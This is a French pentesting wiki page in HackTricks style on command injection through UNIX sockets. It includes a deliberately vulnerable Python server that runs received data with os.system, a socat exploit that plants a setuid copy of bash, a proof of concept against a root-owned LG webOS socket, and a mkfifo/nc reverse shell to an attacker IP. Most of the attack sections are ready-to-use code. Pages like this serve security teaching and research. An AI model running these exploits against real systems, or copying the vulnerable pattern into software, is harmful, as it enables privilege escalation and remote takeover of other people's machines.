# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Exemple de liaison de socket avec Python

Dans l'exemple suivant, un **unix socket est créé** (`/tmp/socket_test.s`) et tout ce qui est **reçu** va être **exécuté** par `os.system`.Je sais que vous n'allez pas trouver cela dans la nature, mais l'objectif de cet exemple est de voir à quoi ressemble du code utilisant des unix sockets et comment gérer l'entrée dans le pire cas possible.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Exécutez** le code avec python : `python s.py` et **vérifiez comment le socket est en écoute** :
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Étude de cas : escalation déclenchée par signal via un socket UNIX appartenant à root (LG webOS)

Certains daemons privilégiés exposent un socket UNIX appartenant à root qui accepte des entrées non fiables et associe des actions privilégiées à des thread-IDs et à des signaux. Si le protocole permet à un client non privilégié d'influencer le thread natif ciblé, il peut être possible de déclencher un code path privilégié et d'effectuer une escalation.<sup>[[1]](#references)</sup>

Pattern observé :
- Se connecter à un socket appartenant à root (par exemple, /tmp/remotelogger).
- Créer un thread et obtenir son thread id natif (TID).
- Envoyer le TID (packé) avec du padding comme requête ; recevoir un acknowledgement.
- Envoyer un signal spécifique à ce TID afin de déclencher le comportement privilégié.

Schéma minimal de PoC :
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Pour obtenir un shell root, il est possible d'utiliser un pattern simple avec un named pipe + nc :
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notes :
- Cette classe de bugs survient lorsque des valeurs provenant de l'état d'un client non privilégié (TIDs) sont considérées comme fiables et associées à des gestionnaires de signaux ou à une logique privilégiés.
- Renforcez la sécurité en imposant l'authentification sur le socket, en validant les formats des messages et en découplant les opérations privilégiées des identifiants de threads fournis depuis l'extérieur.

## Références

- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
